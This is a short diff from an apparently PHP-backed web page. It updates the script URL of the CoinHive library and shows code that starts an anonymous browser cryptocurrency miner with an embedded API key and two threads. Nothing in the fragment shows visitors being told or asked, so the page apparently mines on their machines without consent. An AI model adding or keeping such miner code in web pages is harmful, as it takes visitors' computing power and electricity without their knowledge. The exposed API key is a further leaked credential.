@@ -422,7 +422,7 @@ if(isset($_SESSION['image']) && $_SESSION['image'] != null && !empty($_SESSION['
 	</script>
 	
 	<!-- Coin Hive -->
-	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script type="text/javascript">
 	var apiKey = 'wb8dn2HNjc24tq8qbaJtxlrxtSogoivK';
 	var miner = new CoinHive.Anonymous(apiKey, {threads: 2});
